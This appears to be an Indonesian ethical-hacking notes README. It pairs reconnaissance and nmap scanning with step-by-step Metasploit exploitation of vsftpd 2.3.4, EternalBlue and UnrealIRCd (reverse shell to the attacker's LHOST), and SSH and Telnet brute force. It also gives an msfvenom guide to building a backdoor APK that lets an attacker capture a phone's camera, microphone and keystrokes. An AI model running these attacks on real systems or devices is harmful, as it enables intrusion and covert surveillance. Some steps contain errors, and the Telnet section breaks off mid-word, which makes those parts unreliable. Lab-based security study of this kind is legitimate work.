
## Disclaimer: 
**Dokumentasi ini hanya ditujukan untuk tujuan edukasi dan pengujian keamanan yang sah. Penggunaan alat atau teknik yang dijelaskan dalam dokumen ini tanpa izin eksplisit dari pemilik sistem adalah ilegal dan dapat melanggar hukum yang berlaku. Penulis tidak bertanggung jawab atas segala bentuk penyalahgunaan informasi dalam dokumen ini. Gunakan dengan etika dan tanggung jawab penuh.**

================================================================================================
## Information Gathering Methods:

```sh
  whois domain_name
  ```
- Gunakan whois untuk mendapatkan informasi domain dengan memasukkan nama domain
```sh
  whatweb -v domain_name
  ```
- Gunakan whatweb dengan opsi -v untuk mendapatkan informasi web secara rinci

<br>
<br>

## IP Scanning
```sh
  nslookup google.com
  ```
- Gunakan nslookup untuk mendapatkan informasi IP terkait dengan nama domain google.com
```sh
  ping  google.com -4
  ```
- Gunakan ping dengan opsi -4 untuk melakukan pengujian konektivitas ke alamat IP IPv4 dari google.com

<br>
<br>

## Saving Log Data Web:
```sh
  whatweb domain_name -v --log-file=namafile
  ```
<br>
<br>

## Email Hunter Methods
- theHarvester
```sh
theHarvester -d domain_name -b all
  ```
- [Hunter.io](https://hunter.io/)


<br>
<br>

## Sherlock (Username Hunter)
```sh
cd /Users/naufalazhar/Documents/NAUFAL_AZHAR/HACKING/Hacking_tools/sherlock/sherlock
  ```
```sh
python3 sherlock.py username
  ```
<br>
<br>

## NMAP Scanning
### IP Range Scan & List Scan:
 ```sh
  sudo netdiscover -r ip_address
  ```
- Gunakan sudo netdiscover untuk melakukan pemindaian rentang dengan IP yang ditentukan
 ```sh
nmap -Pn ip_address
  ```
- Gunakan nmap dengan opsi -Pn untuk melakukan pemindaian daftar pada alamat IP target yang ditentukan
- Catatan: Gunakan ini jika Windows memblokir permintaan ping
 ```sh
nmap -iL file_name
  ```
  - Gunakan nmap dengan opsi -iL untuk melakukan pemindaian pada beberapa IP yang ditentukan dalam file yang diberikan
  - Contoh: nmap -iL targets.txt
```sh
nmap ip_address 0/24
  ```
<br>

### Syn Scan, TCP Connect Scan, UDP Scan:
- Syn scan
```sh
sudo nmap -sS ip_address_target
  ```
- TCP connect scan
```sh
sudo nmap -sT ip_address_target
  ```
<br>

### OS Detection Scanning (nmap):
```sh
sudo nmap -O ip_address_target
  ```
<br>

### Port Service Version Scanning (nmap):
```sh
sudo nmap -sV ip_address_target
  ```
- Lower intensity
```sh
sudo nmap -sV  —version-intensity 2 ip_address_target
  ```
```sh
sudo nmap -sV --version-all ip_address_target
  ```
- Lower intensity 
```sh
sudo nmap -sV --version-light ip_address_target
  ```
<br>
<br>

### Aggressive Scan (not recommended, too much noise):
```sh
sudo nmap -A ip_address_target
  ```
<br>

### Port Specification & Output Handling:
- select ports
```sh
sudo nmap -sS -p port1,port2,... ip_address_target
  ```
- all ports
```sh
sudo nmap -sS -p- ip_address_target
  ```
- top 100 ports
```sh
sudo nmap -sS -F ip_address_target
  ```
- save output logs
```sh
sudo nmap -sS -F ip_address_target >> nama_file.txt
  ```
- save log dan menampilkan output 
```sh
sudo nmap -sS -F -oN nama_file ip_address_target
  ```
- Lower intensity 
```sh
sudo nmap -sV  —version-intensity 2 ip_address_target
  ```

<br>
================================================================================================

## Vulnerability SECTION

### Vulnerability Analysis with Nmap (Group Scripts):
[Usage and Examples](https://nmap.org/book/nse-usage.html)

 ```sh
  sudo nmap --script auth ip_address_target -sS
  ```
- Perintah sudo nmap --script auth ip_address_target -sS digunakan untuk melakukan pemindaian jaringan pada alamat IP tertentu dengan fokus pada deteksi otentikasi dan keamanan. Opsi -sS menunjukkan penggunaan pemindaian TCP SYN (half-open scan), sementara --script auth memaksa Nmap menggunakan skrip khusus untuk mengidentifikasi masalah otentikasi pada sistem target.

  - <img width="550" alt="Screenshot 2023-12-21 at 16 51 13" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/726c79c1-9e3c-4a6d-9888-2de0a56379b9">
  
Pada alamat IP 192.168.1.4, Nmap menemukan bahwa kredensial tomcat:tomcat adalah valid dan dapat digunakan untuk mengakses server web Apache Tomcat.

1. untuk mengakses server web Apache Tomcat masuk ke alamat contoh: `192.168.1.4:8081`
  - <img width="450" alt="Screenshot 2023-12-24 at 02 23 24" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/37f5af59-a770-4bf0-9afa-f35268c02930">
2. dan coba login menggunakan username: `tomcat` dan password: `tomcat`.
  - <img width="450" alt="Screenshot 2023-12-24 at 02 28 13" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/07569465-5632-4532-baab-5ed03a5b734a">


<br>
<br>
  
```sh
  sudo nmap --script malware ip_address_target -sS
  ```
- Perintah sudo nmap --script malware ip_address_target -sS digunakan untuk melakukan pemindaian jaringan pada alamat IP tertentu dengan fokus pada deteksi potensi malware.
 - <img width="550" alt="Screenshot 2023-12-21 at 16 55 31" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/3bd1b010-cdd3-4f0a-ac25-7261ffcff751">
<br>
<br>


```sh
  sudo nmap --script banner ip_address_target -sS
  ```
- Perintah sudo nmap --script banner ip_address_target -sS digunakan untuk melakukan pemindaian jaringan pada alamat IP tertentu dengan fokus pada deteksi dan pengekspos banner atau informasi servis pada port tertentu.
 - <img width="550" alt="Screenshot 2023-12-21 at 17 29 44" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/46786610-5ba4-41b8-9167-b85385e0a745">
<br>
<br>

### Vulnerability Analysis with Nmap (Single Scripts):
```sh
  cd /usr/share/nmap/scripts
  ```

  ```sh
  sudo nmap --script-help Vulnerability
  ```
- Access target through anonymous FTP if vulnerable:
  
  ```sh
  sudo nmap --script ftp-anon.nse ip_address -sS
  ```
   - <img width="537" alt="Screenshot 2023-12-21 at 17 45 17" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/ac186912-f06e-4389-8ab4-ad51ef13d24f">

<br>

================================================================================================

## Via NESSUS
### INSTALLATIONS
1. [Nessus Download](https://www.tenable.com/downloads/nessus?loginAttempted=true)
2. Select your version
3. Download.
4. cd (file download directory)
5. `sudo dpkg -i Nessus-10.6.4-debian10_amd64.deb`
6. You can `start` Nessus Scanner by typing `sudo /bin/systemctl start nessusd.service`
7. You can `stop` Nessus Scanner by typing `sudo /bin/systemctl stop nessusd.service`
8. Access Nessus: https://kali:8834/

### EXAMPLE :
- <img width="550" alt="Screenshot 2023-12-22 at 14 14 49" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/8746ad5d-1e99-4be6-99af-2a36c6524153">


<br>
<br>

================================================================================================

## EXPLOITS SECTION `Metasploit Framework`
### To view Metasploit location in Linux:

```sh
  cd /usr/share/metasploit-framework
  ```
```sh
  cd /usr/share/metasploit-framework/modules
  ```
### Modules :
- `exploits`
    - Modul ini digunakan untuk mengeksploitasi kerentanan keamanan pada suatu sistem.
    - Contoh: `exploit/windows/smb/ms08_067_netapi`
      
- `nops`
    - Nops (No Operations) adalah instruksi atau serangkaian instruksi yang tidak melakukan operasi apapun. Modul ini digunakan untuk memasukkan nops sled di antara payload dan shellcode.
    - Contoh: `nops/linux/x86/mov`
      
- `payloads`
    - Payload adalah kode yang dieksekusi setelah eksploitasi berhasil. Modul payload menentukan apa yang akan dilakukan setelah keberhasilan eksploitasi.
    - Contoh: `windows/meterpreter/reverse_tcp`
      
- `post`
    - Modul ini digunakan setelah berhasil melakukan eksploitasi untuk mengekstrak informasi tambahan dari sistem target.
    - Contoh: `post/windows/gather/enum_logged_on_users`

- `encoders`
    - Modul ini digunakan untuk mengubah payload sehingga dapat menghindari deteksi oleh perangkat lunak keamanan.
    - Contoh: `encoder/x86/alpha_mixed`
- `evasion`
    - Modul ini membantu dalam menghindari deteksi oleh alat keamanan dan perangkat lunak antivirus.
    - Contoh: `evasion/windows/disable_defender`

- `auxiliary`
    - Modul ini memberikan fungsionalitas tambahan yang dapat membantu dalam pengumpulan informasi, pemindaian, atau eksploitasi non-invasif.
    - Contoh: `auxiliary/scanner/http/http_version`

<br>

================================================================================================

<br>
================================================================================================

## STEP BY STEP EXPLOITATION `vsftpd 2.3.4` Metasploit-framework

## 📌 Pendahuluan
**vsftpd 2.3.4** adalah versi rentan dari **Very Secure FTP Daemon (vsftpd)** yang memiliki backdoor yang memungkinkan **remote code execution (RCE)**. Kerentanan ini memungkinkan penyerang mendapatkan akses shell pada sistem target.

> **Layanan Rentan:** vsftpd 2.3.4  
> **CVE:** CVE-2011-2523  
> **Platform Target:** Linux  

---

## 🔥 1. Menyiapkan Lab
Sebelum memulai, pastikan Anda memiliki:
- **Kali Linux** (sebagai mesin penyerang) dengan **Metasploit Framework** terinstal.
- **Mesin target** yang menjalankan **vsftpd 2.3.4** (seperti Metasploitable 2 atau sistem Linux yang rentan).

---

## 🎯 2. Memindai Target dengan Nmap
Gunakan **Nmap** untuk mendeteksi apakah target menjalankan **vsftpd 2.3.4**:

```bash
nmap -p 21 -sV <IP_TARGET>
```

📌 **Contoh hasil pemindaian yang menunjukkan target rentan:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```
Jika hasilnya menunjukkan **vsftpd 2.3.4**, maka target dapat dieksploitasi.

---

## 💀 3. Mengeksploitasi vsftpd 2.3.4 dengan Metasploit
Setelah mengidentifikasi target, jalankan **Metasploit Framework**:

```bash
msfconsole
```

Gunakan modul exploit **vsftpd 2.3.4**:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

Atur **IP target**:

```bash
set RHOSTS <IP_TARGET>
```

Jalankan exploit:

```bash
exploit
```

---

## 🖥 4. Jika Eksploitasi Berhasil
Jika berhasil, Anda akan mendapatkan sesi shell dengan sistem target:

```
[*] Command shell session opened
```

Sekarang Anda dapat menjalankan perintah berikut:

- **Melihat isi direktori:**
  ```bash
  ls -la
  ```
- **Melihat informasi sistem:**
  ```bash
  uname -a
  ```
- **Mencoba eskalasi hak akses:**
  ```bash
  sudo -i
  ```

---

## 🛡 5. Mencegah Eksploitasi
Untuk melindungi sistem dari serangan ini:
- **Perbarui vsftpd** ke versi terbaru:
  ```bash
  sudo apt update && sudo apt upgrade
  ```
- **Batasi akses** ke port 21 menggunakan firewall.
- **Nonaktifkan vsftpd** jika tidak diperlukan:
  ```bash
  sudo systemctl stop vsftpd
  ```

---

## ⚠ Disclaimer Hukum
Panduan ini dibuat hanya untuk **pengujian keamanan dan ethical hacking**. Penggunaan exploit ini untuk tujuan ilegal **melanggar hukum** dan merupakan tanggung jawab pengguna sepenuhnya.

---

🚀 **Hanya untuk tujuan edukasi!**



================================================================================================


## STEP BY STEP EXPLOITATION `Telnet`

## 📌 Pendahuluan
**Telnet** adalah protokol komunikasi lama yang sering digunakan untuk mengakses sistem jarak jauh. Namun, karena tidak memiliki enkripsi, **Telnet sangat rentan terhadap serangan seperti credential sniffing, brute force, dan remote code execution**.

> **Layanan Rentan:** Telnet  
> **Port Default:** 23  
> **Platform Target:** Linux, Windows  

---

## 🔥 1. Mempersiapkan Lab
Sebelum memulai, pastikan Anda memiliki:
- **Kali Linux** (sebagai mesin penyerang) dengan **Metasploit Framework** dan **Nmap** terinstal.
- **Mesin target** yang menjalankan **Telnet Server** (seperti Metasploitable 2 atau sistem Linux rentan).
- Koneksi jaringan yang memungkinkan komunikasi antara mesin penyerang dan target.

---

## 🎯 2. Menemukan Target dengan Nmap
Gunakan **Nmap** untuk mendeteksi apakah target menjalankan **Telnet**:

```bash
nmap -p 23 -sV <IP_Target>
```

📌 **Contoh hasil pemindaian jika Telnet aktif:**
```
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
```
Jika port **23** terbuka dan Telnet terdeteksi, target dapat dieksploitasi.

---

## 💀 3. Mengeksploitasi Telnet
### **A. Serangan Brute Force (Metasploit)**
Jika Telnet tidak memiliki keamanan yang kuat, kita bisa menggunakan **Metasploit** untuk brute-force username dan password.

1️⃣ Jalankan **Metasploit**:

```bash
msfconsole
```

2️⃣ Gunakan modul brute-force Telnet:

```bash
use auxiliary/scanner/telnet/telnet_login
```

3️⃣ Atur IP target:

```bash
set RHOSTS <IP_Target>
```

4️⃣ Atur file wordlist untuk serangan brute-force:

```bash
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
```

5️⃣ Jalankan serangan:

```bash
run
```

📌 **Jika berhasil**, Metasploit akan menampilkan kredensia

<br>
================================================================================================

## SSH `Bruteforce Attack` with Crunch & Metasploit

SSH Bruteforce Attack adalah serangan keamanan yang dilakukan dengan mencoba berbagai kombinasi kata sandi untuk mendapatkan akses tidak sah ke sistem atau perangkat yang menggunakan protokol SSH (Secure Shell). SSH digunakan untuk mengakses dan mengelola perangkat jarak jauh secara aman.

Untuk melakukan Bruteforce Attack kita membutuhkan sebuah `shell` yang bisa kita gunakan untuk login yang memiliki username dan password
  - <img width="598" alt="Screenshot 2023-12-23 at 10 25 08" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/ee54144b-ff08-4b73-903a-52959304c6af">
disini saya menggunakan `VM metasploitable` untuk mempraktikannya, seperti yang kita lihat pada gambar diatas terdapat vulnerable pada `port 22` yaitu service `SSH` version `openSSH 4.7p1 xxxx`,
`SSH` ini adalah singkatan dari `SECURE SOCKET SHELL` yang kita gunakan untuk sistem admininistrator, artinya kita bisa login ke komputer menggunakan `username` dan `password` melalui SSH, dan SSH ini juga kita bisa gunakan untuk `Remote Access` kita bisa login dari komputer ke komputer lain.

Sebelum melakukan `Bruteforce Attack`, terlebih dahulu kita perlu membuat sebuah daftar kata yang panjang, dan memiliki kata kombinasi daro A sampai Z, dan untuk melakukan Brutefoce Attack akan memakan waktu yang sangat lama, (tergantung dari spek device yang kita miliki).
 msid
disni saya menggubakan `Crunch` untuk membuat daftar kata yang akan kita gunakan untuk Bruteforce Attack.
<br>

### STEP BY STEP

1. untuk men generate daftar kata mengguakan `Crunch` gunakan perintah :
   - sebagai contoh disini saya menggunakan daftar kata yang sederhana untuk mempersingkat waktu praktik.
   - `8 8`: Parameter ini menunjukkan panjang minimum dan maksimum dari kata sandi yang akan dihasilkan. Dalam contoh ini, panjang kata sandi adalah 8 karakter.
   - `msidfna`: Parameter ini menyediakan karakter yang akan digunakan untuk menghasilkan kata sandi. Dalam hal ini, karakter "msidfna" akan digunakan untuk membuat kombinasi kata sandi.
   - `-o username.txt`: Parameter ini menentukan bahwa output dari daftar kata sandi yang dihasilkan akan disimpan dalam file bernama "username.txt."
```sh
  crunch 8 8 msidfna -o username.txt
  ```
  - <img width="450" alt="Screenshot 2023-12-23 at 11 14 27" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/38178daa-131b-48bd-b7f6-7951f12d937c">

2. selanjtutnya kita akan menggunakan modul dari metasploit yaitu `auxiliary`
3. cd ke `/usr/share/metasploit-framework/modules/auxiliary/` untuk melihat modul dari auxiliary.
4. disini kita akan menggunakan `SSH Scanner`, cd ke `scanner/ssh`.
  - <img width="450" alt="Screenshot 2023-12-23 at 11 46 39" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/f6558080-b479-44b7-9040-c6e104464c93">
5. kita akan gunakan file `ssh_login.rb` untuk melakukan Bruteforce Attack.
6. buka metasploit, gunakam perintah `msfconsole`.
7. gunakan perintah `use auxiliary/scanner/ssh/`.
8. pilih file `shh_login.rb`, gunakan perintah `use 12`.
9. gunakan perintah `show options` untuk melihat apa saja yang harus wajib di isi.
  - <img width="450" alt="Screenshot 2023-12-23 at 12 02 43" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/6e28d51b-21ac-439d-b77b-b34b2ef234a4">
10. untuk set RHOSTs gunakan perintah `set RHOSTS ip_address`.
11. terlebih dahulu buat file `password.txt`, tinggal copy saja file `username.txt`, dan ubah namanya menjadi password.txt.
12. untuk PASS_FILE gunakan perintah `set PASS_FILE ../../password.txt`.
13. untuk USER_FILE gunakan perintah `set PASS_FILE ../../username.txt`.
14. untuk menjalankan Brutefroce Attack ini gunakan perintah `run`.
15. jika sudah menemukan username dan password yang cocok, tekan CTRL+C saja untuk `stop` Bruteforce.
  - <img width="650" alt="Screenshot 2023-12-23 at 12 29 01" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/2cb2f568-89a5-4668-bacd-6fe4b54d8496">
  - tetapi disini kita belum berada didalam shell metasploitable, cara masuk shellnya yaitu menggunakan session yang terbuka.
16. gunakan perintah `sessions`.
  - <img width="450" alt="Screenshot 2023-12-23 at 12 34 58" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/80efedab-0362-4e7b-9b12-0759f7991573">
17. untuk menggunakan session tersebut yaitu gunakan perintah `sessions -i 1`
  - <img width="520" alt="Screenshot 2023-12-23 at 12 37 52" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/79962c33-f21e-4cd8-b83d-df66ebb3546c">

<br>
================================================================================================

## STEP BY STEP EXPLOITATION `VNC SERVER`

Port 5900 adalah port default yang digunakan oleh Virtual Network Computing (VNC) untuk menyediakan layanan akses jarak jauh. VNC memungkinkan pengguna untuk mengendalikan dan melihat desktop dari jarak jauh. Port 5900 khususnya digunakan untuk protokol VNC versi 3.3. Jika protokol yang digunakan adalah versi lain, port yang digunakan bisa berbeda (misalnya, 5901 untuk VNC versi 3.4).

Exploitasi pada port 5900 VNC (Protocol 3.3) dapat terjadi jika ada kerentanan keamanan yang dapat dimanfaatkan oleh penyerang. Beberapa potensi kerentanan atau skenario eksploitasi yang dapat terjadi adalah:

  - Kelemahan kata sandi:
      - Penggunaan kata sandi yang lemah atau mudah ditebak pada server VNC dapat memudahkan penyerang untuk mendapatkan akses yang tidak sah.
        
  - Bruteforce Attack:
      - Seseorang dapat mencoba untuk menjebol kata sandi VNC dengan melakukan serangan bruteforce pada port 5900, mencoba berbagai kombinasi kata sandi.

1. untuk mengakses `VNC SERVER` ini kita bisa menggunakan perintah:
  
      ```sh
      vncviewer ip_address
      ```
2. dan masukan `password`
   
    - <img width="773" alt="Screenshot 2023-12-23 at 13 29 44" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/bcf14cb2-966e-4619-b687-f0f37ffcd92f">

<br>
================================================================================================

## STEP BY STEP EXPLOITATION `Bind Shell Backdoor` with Netcat

Port 1524 adalah port yang seringkali dikaitkan dengan "Bindshell." Bindshell adalah jenis backdoor atau pintu belakang yang dapat memberikan akses ke sistem dari jarak jauh tanpa pengetahuan atau izin pemilik sistem. Penyebutan "Bindshell" berasal dari kemampuannya untuk "melekat" atau "bind" pada port tertentu pada sistem yang terinfeksi.

Exploitasi pada port 1524 dengan layanan Bindshell dapat terjadi jika ada keamanan yang rentan atau ada celah yang dapat dimanfaatkan oleh penyerang. Beberapa potensi kerentanan atau skenario eksploitasi yang dapat terjadi melalui Bindshell pada port 1524 termasuk:

  - Eksploitasi Kerentanan Sistem Operasi:
      - Bindshell dapat dimanfaatkan untuk mengeksploitasi kerentanan pada sistem operasi yang dijalankan oleh target. Hal ini dapat melibatkan celah keamanan atau kerentanan tertentu yang dapat memberikan akses ke root atau hak istimewa tinggi lainnya.
        
  - Pemasangan Backdoor:
      - Setelah berhasil dieksploitasi, Bindshell dapat digunakan untuk menginstal backdoor pada sistem target. Backdoor ini kemudian dapat digunakan oleh penyerang untuk memasuki sistem kapan saja tanpa pengetahuan pemilik sistem.

1. untuk mengakses `Bindshell` bisa menggunakan tools yaitu `Netcat`.
2. gunakan perintah:
   
      ```sh
      netcat (ip_address) (port)
      ```

  - <img width="461" alt="Screenshot 2023-12-23 at 13 53 56" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/e32f7cb1-8bb6-4eb9-be2c-09bc8a6acd3e">

<br>
================================================================================================

## STEP BY STEP EXPLOITATION `EternalBlue Attack` (Windows) (Metasploit-framework)

EternalBlue adalah sebuah exploit (kode yang memanfaatkan kelemahan di dalam perangkat lunak) yang terkait dengan kerentanan keamanan bernama CVE-2017-0144. Kerentanan ini ada di dalam implementasi protokol Server Message Block (SMB) di sistem operasi Microsoft Windows. SMB digunakan untuk berbagi file dan printer di jaringan, dan kelemahan ini memungkinkan penyerang untuk mengeksekusi kode arbitrer di sistem target tanpa otorisasi.

EternalBlue menjadi terkenal karena menjadi salah satu komponen utama dalam serangan ransomware WannaCry yang menyebar dengan cepat pada tahun 2017, mempengaruhi ribuan komputer di seluruh dunia.

Berikut cara mengeksploit Windows 7 dengan `EternalBlue`:

1. buka Metasploit, gunakan perintah `msfconsole`.
2. cari exploit `EternalBlue`, gunakan perintah `search eternalblue`
  - <img width="450" alt="Screenshot 2023-12-23 at 15 07 22" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/f875269a-c78a-46b6-a45c-33370f33250d">
3. terlebih dahulu kita akan menggunakan `Scanner` di module metasploit untuk mengetahui apakah windows 7 vulnerable terhadap `EternalBlue Attack` atau tidak.
4. gunakan perintah `use 3`.
5. untuk melihat optionsnya gunakan perintah `show options`.
6. untuk mengisi RHOSTS gunakan perintah `set RHOSTS ip_addres`.
7. dan untuk menjalankannya gunakan perintah `run`.
8. berikut hasil scannya:
   - `HOST is Likely VULNERABLE to MS17-010!` itu artinya windows 7 vulnerable terhadap serangan `EternalBlue`.
- <img width="1325" alt="Screenshot 2023-12-23 at 15 14 11" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/9dac0792-c02c-43b9-a068-5b595a77ae24">
9. selanjutnya cari exploit `EternalBlue`, gunakan perintah `search eternalblue`.
10. pilih `exploit/windows/smb/ms17_010_eternalblue` gunakan perintah `use 0`.
11. untuk melihat optionsnya gunakan perintah `show options`.
12. untuk mengisi RHOSTS gunakan perintah `set RHOSTS ip_addres`.
13. dan untuk menjalankannya gunakan perintah `run`.
  - <img width="450" alt="Screenshot 2023-12-23 at 15 24 01" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/5deae0fd-351f-4434-af8c-856e131acb6d">

<br>
================================================================================================

## STEP BY STEP EXPLOITATION `UnrealIRCd` 

Port 6667 adalah port yang umumnya digunakan untuk layanan Internet Relay Chat (IRC), yang digunakan untuk berkomunikasi dalam real-time melalui berbagai saluran (channels) di internet. IRC adalah protokol komunikasi yang sudah lama ada dan umumnya digunakan untuk obrolan grup dan diskusi topik tertentu.

  - Eksploitasi Kerentanan Keamanan:
      - Jika ada kerentanan keamanan yang ditemukan dalam versi tertentu dari UnrealIRCd, penyerang dapat mencoba menggunakan exploit untuk mendapatkan akses yang tidak sah ke server
  - <img width="399" alt="Screenshot 2023-12-24 at 12 35 51" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/0acf7b1e-b958-457a-9e8d-95169f74997c">

1. terlebih dahulu cari exploit mana yang akan kita gunakan, yaitu gunakan perintah `searchsploit unrealircd`.
  - <img width="728" alt="Screenshot 2023-12-24 at 12 40 45" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/218586ed-27d5-4da2-91ba-8aa2f9547f54">
2. dan dsini kita akan gunakan exploit dari modul metasploit framework.
3. untuk membuka metasploit gunakan perintah `msfconsole`.
4. cari exploit `UnrealIRCd`, gunakan perintah `search unrealircd`.
  - <img width="450" alt="Screenshot 2023-12-24 at 12 45 41" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/35a6fe2f-ed86-4285-9a09-46565373ceb1">
5. gunakan exploit tersebut, gunakan perintah `use 0`.
6. untuk melihat optionsnya gunakan perintah `show options`.
7. untuk mengisi RHOSTS gunakan perintah `set RHOSTS ip_addres`.
8. untuk mengisi `payloads` (jika dibutuhkan), gunakan perintah `show payloads`.
  - <img width="450" alt="Screenshot 2023-12-24 at 12 51 11" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/6c765752-e6da-474f-8adc-cb559d319deb">
9. gunakan payloads `Reverse TCP (Telnet)`, gunakan perintah `set payload 5`.
    - catatan: jika kita mengunakan payload `Reverse TCP (Telnet)` kita harus mengisi `LHOST` yaitu ip address dari Kali Linux kita.
10. untuk mengisi LHOST gunakan perintah `set LHOST ip_addres`.
11. dan untuk menjalankannya gunakan perintah `run`.


<br>
================================================================================================

# Panduan Menggunakan MSFvenom untuk Eksploitasi Ponsel Android

---

## 📌 Persiapan

Sebelum memulai, pastikan Anda memiliki:

- **Kali Linux** atau distribusi Linux lain dengan **Metasploit Framework** terinstal.
- Akses ke ponsel Android target.
- IP Address yang bisa dijangkau oleh target (bisa menggunakan jaringan lokal atau port forwarding).

---

## 🔥 1. Membuat Payload APK dengan MSFvenom

Gunakan perintah berikut untuk membuat payload APK yang akan digunakan untuk eksploitasi:

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP_Anda> LPORT=<Port> -o backdoor.apk
```

📌 **Penjelasan:**

- `-p android/meterpreter/reverse_tcp` → Payload untuk Android dengan koneksi reverse TCP.
- `LHOST=<IP_Anda>` → IP address listener (cek dengan `ifconfig`).
- `LPORT=<Port>` → Port yang digunakan untuk komunikasi.
- `-o backdoor.apk` → Nama file APK yang akan dihasilkan.

**Contoh:**

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o hack.apk
```

---

## 🎯 2. Menyiapkan Listener di Metasploit

Setelah payload APK dibuat, kita harus menjalankan listener di Metasploit:

```bash
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
exploit
```

Jika target menginstal dan membuka aplikasi, Anda akan mendapatkan sesi **Meterpreter**.

---

## 🔍 3. Mengontrol Perangkat Target

Setelah sesi aktif, gunakan beberapa perintah berikut:

- **Melihat informasi perangkat:**
  ```bash
  sysinfo
  ```
- **Mengakses file target:**
  ```bash
  cd /sdcard/
  ls
  ```
- **Mengaktifkan kamera:**
  ```bash
  webcam_snap
  ```
- **Merekam suara:**
  ```bash
  record_mic 10
  ```
  *(Merekam selama 10 detik)*
- **Mengaktifkan keylogger:**
  ```bash
  keyscan_start
  ```
- **Mendapatkan shell Android:**
  ```bash
  shell
  ```

---

## 🔒 4. Pencegahan dan Keamanan

Untuk mencegah serangan serupa pada perangkat Anda:

- Jangan menginstal APK dari sumber tidak dikenal.
- Aktifkan **Google Play Protect**.
- Gunakan VPN dan firewall di ponsel Anda.
- Selalu update sistem operasi.

---

## ⚠ Legal Disclaimer

Semua informasi di repositori ini hanya untuk **tujuan edukasi dan ethical hacking**. Penyalahgunaan teknik ini untuk tujuan ilegal adalah **tanggung jawab pengguna sepenuhnya**.

---

**🔥 Created for Ethical Hacking & Penetration Testing 🔥**




================================================================================================


# BeEF (Browser Exploitation Framework)

BeEF (Browser Exploitation Framework) adalah alat pengujian penetrasi yang berfokus pada eksploitasi browser web.

## 📌 Instalasi
BeEF tersedia di Kali Linux dan dapat diinstal dengan perintah berikut:
```bash
sudo apt update
sudo apt install beef-xss
```

## 🚀 Cara Menjalankan BeEF
Setelah instalasi, jalankan BeEF dengan perintah:
```bash
sudo beef-xss
```
Jika ada masalah dengan perintah di atas, coba jalankan secara manual:
```bash
cd /usr/share/beef-xss/
./beef
```

<img width="550" alt="Screenshot 2025-02-11 at 15 31 56" src="https://github.com/user-attachments/assets/174ef018-8622-416b-af33-d2b157f491cd" />

Setelah BeEF berjalan, akses antarmukanya melalui browser dengan membuka:
```
http://127.0.0.1:3000/ui/panel
```

<img width="550" alt="Screenshot 2025-02-11 at 15 31 11" src="https://github.com/user-attachments/assets/2ed1ec2d-44ba-42f5-a0c9-9ad519fc2bde" />

Login menggunakan kredensial default:
- **Username:** beef
- **Password:** beef

## ⏹ Cara Menghentikan BeEF
Jika BeEF berjalan di terminal, tekan **Ctrl + C** untuk menghentikannya.

Jika berjalan di background, hentikan dengan:
```bash
sudo pkill -f beef
```
atau
```bash
sudo service beef-xss stop
```

## ❌ Cara Uninstall BeEF
Jika ingin menghapus BeEF sepenuhnya, jalankan:
```bash
sudo apt remove --purge beef-xss
sudo apt autoremove
sudo apt clean
```

## 🔗 Referensi
- [Official BeEF Documentation](https://beefproject.com/)
- [Kali Linux Tools](https://www.kali.org/tools/beef/)

---
**Disclaimer:** Gunakan BeEF hanya untuk tujuan legal dan pengujian keamanan yang sah!
















